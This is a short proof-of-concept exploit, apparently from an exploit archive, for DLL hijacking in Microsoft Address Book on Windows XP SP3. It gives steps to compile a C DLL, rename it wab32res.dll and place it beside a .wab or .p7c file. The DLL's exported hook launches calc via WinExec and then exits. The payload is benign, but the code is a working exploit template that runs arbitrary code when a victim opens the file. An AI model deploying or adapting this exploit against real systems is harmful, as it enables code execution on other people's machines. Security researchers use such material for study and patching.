/*
# Greetz to :b0nd, Fbih2s,r45c4l,Charles ,j4ckh4x0r, punter,eberly, Charles, Dinesh Arora , Anirban , Dinesh Arora
# Site : www.beenuarora.com

Exploit Title: Microsoft Address Book DLL Hijacking
Date: 25/08/2010
Author: Beenu Arora
Tested on: Windows XP SP3 , Microsoft Address Book 6.00.2900.5512
Vulnerable extensions: wab , p7c

Compile and rename to wab32res.dll, create a file in the same dir with one
of the following extensions:
.wab,p7c
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void hook_startup() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

// POC: http://www.exploit-db.com/sploits/14745.zip